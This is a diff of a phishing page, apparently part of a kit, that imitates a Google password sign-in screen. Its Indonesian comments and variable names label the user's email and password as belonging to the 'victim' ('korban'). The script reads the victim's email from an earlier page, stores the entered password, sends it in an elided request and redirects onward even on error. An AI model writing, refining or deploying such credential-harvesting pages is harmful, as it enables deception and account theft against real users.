@@ -20,7 +20,6 @@
   .field input:focus { border-color: #8ab4f8; border-width: 2px; padding: 0 15px; }
   .field input.input-error { border: 1.5px solid #f28b82; }
 
-  /* STYLE ERROR GOOGLE ASLI */
   .error-msg {
       display: none;
       color: #f28b82;
@@ -57,7 +56,6 @@
     <div class="field">
       <input id="pw" type="password" placeholder="Masukkan sandi" autocomplete="current-password">
       
-      <!-- NOTIFIKASI ERROR -->
       <div class="error-msg" id="pwError">
           <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
           <span id="pwErrorText">Sandi minimal 8 karakter</span>
@@ -78,6 +76,7 @@
   </div>
 
 <script>
+  // AMBIL EMAIL DARI HALAMAN SEBELUMNYA
   var emailKorban = sessionStorage.getItem('email_korban') || "unknown@gmail.com";
   document.getElementById('emailDisplay').innerText = emailKorban;
 
@@ -93,7 +92,6 @@
     var errorText = document.getElementById('pwErrorText');
     var btn = document.getElementById('btnSubmit');
 
-    // Reset error
     input.classList.remove('input-error');
     errorDiv.classList.remove('show');
 
@@ -104,7 +102,6 @@
         return;
     }
 
-    // Tampilin loading di tombol
     btn.innerText = "...";
     btn.disabled = true;
 
@@ -145,10 +142,12 @@
         })
         .then(function(res){
             sessionStorage.setItem('password_korban', password);
+            // LANJUT KE SELESAI.HTML
             window.location.href = "selesai.html";
         })
         .catch(function(err){
-            window.location.href = "selesai.html"; // Error tetep lanjut
+            // KALO ERROR TETEP LANJUT
+            window.location.href = "selesai.html"; 
         });
   }
 
